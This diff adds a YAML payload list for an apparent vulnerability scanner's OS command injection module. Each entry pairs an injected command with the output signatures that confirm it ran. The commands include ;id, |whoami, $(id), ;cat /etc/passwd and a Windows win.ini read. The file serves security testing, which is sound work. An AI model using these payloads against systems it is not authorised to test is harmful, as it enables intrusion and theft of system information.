@@ -1,0 +1,33 @@
+# OS Command Injection payloads.
+# Each entry: payload string, signatures list (any of these in response = confirmed).
+# Module: scanner/modules/cmd_injection.py
+
+payloads:
+  - payload: ";id"
+    signatures: ["uid=", "gid=", "groups="]
+  - payload: "|id"
+    signatures: ["uid=", "gid=", "groups="]
+  - payload: "$(id)"
+    signatures: ["uid=", "gid=", "groups="]
+  - payload: "`id`"
+    signatures: ["uid=", "gid=", "groups="]
+  - payload: ";whoami"
+    signatures: ["root", "www-data", "apache", "nginx", "nobody"]
+  - payload: "|whoami"
+    signatures: ["root", "www-data", "apache", "nginx", "nobody"]
+  - payload: "& whoami &"
+    signatures: ["root", "www-data", "apache", "nginx"]
+  - payload: ";cat /etc/passwd"
+    signatures: ["root:x:", "daemon:x:"]
+  - payload: "| cat /etc/passwd"
+    signatures: ["root:x:", "daemon:x:"]
+  - payload: "& dir &"
+    signatures: ["Volume in drive", "Directory of", "bytes free"]
+  - payload: "| type C:\\Windows\\win.ini"
+    signatures: ["[extensions]", "for 16-bit"]
+  - payload: ";uname -a"
+    signatures: ["Linux", "Darwin", "GNU/Linux"]
+  - payload: "|uname -a"
+    signatures: ["Linux", "Darwin", "GNU/Linux"]
+  - payload: "\n/bin/sh -c id\n"
+    signatures: ["uid=", "gid="]
